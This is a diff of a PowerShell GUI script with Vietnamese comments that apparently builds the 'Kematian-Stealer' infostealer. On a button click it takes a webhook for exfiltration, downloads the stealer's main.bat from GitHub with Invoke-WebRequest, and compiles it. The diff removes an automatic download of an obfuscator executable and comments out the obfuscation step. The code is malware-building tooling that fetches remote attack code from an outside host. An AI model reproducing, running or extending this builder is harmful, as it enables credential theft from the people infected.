@@ -30,18 +30,6 @@ function Obfuscate-String {
 $filePath = ".\batchobfuscator.exe"
 
 # Kiểm tra xem file có tồn tại không
-if (-Not (Test-Path $filePath)) {
-    # Nếu không tồn tại, tải xuống file từ URL
-    $url = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"
-    Write-Host "File không tồn tại. Đang tải xuống từ $url..."
-    
-    # Tải xuống file
-    Invoke-WebRequest -Uri $url -OutFile $filePath
-    
-    Write-Host "Tải xuống hoàn tất."
-} else {
-    Write-Host "File đã tồn tại."
-}
 
 # Lấy UUID của hệ thống
 
@@ -132,7 +120,7 @@ $button.Add_Click({
     if (-not [string]::IsNullOrWhiteSpace($webhook)) {
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
-        $filePathprotect = "$env:TEMP\main_obf.bat"
+        $filePathprotect = "$env:TEMP\main.bat"
         
         # Download the file
         Invoke-WebRequest -Uri $url -OutFile $filePath
@@ -150,7 +138,7 @@ $button.Add_Click({
         $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path
 
         # Execute the .bat file
-        Start-Process -FilePath $protectPath -ArgumentList "-f $filePath -nu -dc" -NoNewWindow -Wait
+        # Start-Process -FilePath $protectPath -ArgumentList "-f $filePath -nu -dc" -NoNewWindow -Wait
         Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait
 
         # Delete the .bat file after execution
